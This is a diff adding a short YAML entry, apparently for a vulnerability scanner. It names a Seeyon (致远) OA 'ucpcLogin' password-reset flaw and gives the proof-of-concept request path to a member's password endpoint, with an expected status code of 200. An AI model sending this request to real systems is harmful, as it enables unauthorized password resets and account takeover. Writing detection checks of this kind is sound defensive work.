@@ -1,0 +1,3 @@
+name: "致远OA-ucpcLogin密码重置漏洞"
+poc: "/seeyon/rest/orgMember/-7273032013234748168/password/share.do"
+status_code: 200
